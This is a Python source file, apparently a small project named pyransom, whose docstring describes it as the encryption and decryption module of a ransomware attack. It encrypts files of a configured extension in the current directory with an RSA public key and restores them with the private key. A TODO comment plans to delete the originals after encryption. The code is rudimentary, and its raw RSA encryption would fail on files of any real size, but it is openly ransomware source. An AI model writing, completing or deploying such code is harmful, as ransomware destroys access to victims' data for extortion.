"""
Initially based on an example of asymmetric encryption in Python
https://gist.github.com/syedrakib/241b68f5aeaefd7ef8e2
This modules serves as both the encryption and the decryption
module of a ransomware attack. Supplied with the public key
(generated with keygen.py) in encryption mode, it encrypts the
selected files. Supplied with the respective private key in decryption
mode, it restores (decrypts) the files. The names of the key files
are set in the params.ini configuration file.

Execution example
$ python pyransom.py -enc 1
"""

# modules import
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
import base64
import argparse
import sys
import os
import configparser

# parameters loading
params = configparser.ConfigParser()
params.read('params.ini')


def encrypt(content, publickey):
    """
    Simple encryption function using RSA Oprtimal Assymetric Encryption Padding http://www.ietf.org/rfc/rfc3447.txt
    :param content: binary file
    :param publickey: public RSA key, read from a DER file
    :return: base64 encoded, encrypted file
    """

    cipher = PKCS1_OAEP.new(publickey)
    encrypted_content = cipher.encrypt(content)
    encoded_encrypted_msg = base64.b64encode(encrypted_content) # base64 encoded strings are database friendly

    return encoded_encrypted_msg


def decrypt(content, privatekey):
    """
    Simple decryption function using RSA Oprtimal Assymetric Encryption Padding http://www.ietf.org/rfc/rfc3447.txt
    :param content: binary file
    :param privatekey: private RSA key, read from a DER file
    :return: original (decrypted) file
    """

    cipher = PKCS1_OAEP.new(privatekey)
    decoded_encrypted_content = base64.b64decode(content)
    decoded_decrypted_content = cipher.decrypt(decoded_encrypted_content)

    return decoded_decrypted_content


def main(enc=None):
    parser = argparse.ArgumentParser()

    # encryption/decryption argument (set to 1 for enc, 0 for dec)
    parser.add_argument('-enc', help='Encrypt/Decrypt - Set to 1 for Encryption, 0 for Decryption')

    args = parser.parse_args()

    if not (enc and args.enc):
        enc = input('Enter 1 for encryption, 0 for decryption: ')

    # IMPORTANT DETAIL: So far we assume that for any encryption/decryption procedure we have our code INSIDE the
    # target directory

    # encryption
    if enc == '1':
        try:
            public_key = RSA.importKey(open(params['RANSOM']['public'], 'rb').read())
            for file in os.listdir():
                if file.endswith(params['RANSOM']['ext2encrypt']):
                    original = open(file, 'rb').read()
                    # TODO: after reading, delete the file so that it can be replaced by our encrypted equivalent
                    encrypted_file = encrypt(original, public_key)
                    with open(file.replace('.', '_') + '_encrypted', 'wb') as out_file:
                        out_file.write(encrypted_file)

        except Exception as e:
            print('Problem with reading public key')
            print(e)

            return None

    # decryption
    else:
        try:
            private_key = RSA.importKey(open(params['RANSOM']['private'], 'rb').read())
            for file in os.listdir():
                if file.endswith("_encrypted"):
                    enc_file = open(file, 'rb').read()
                    decrypted_file = decrypt(enc_file, private_key)
                    os.remove(file)
                    with open(file.replace('_', '.').rsplit('.', 1)[0], 'w') as dec_file:
                        dec_file.write(decrypted_file.decode('utf-8'))

        except Exception as e:
            print('Problem with private key')
            print(e)

            return None


if __name__ == "__main__":
    main(sys.argv)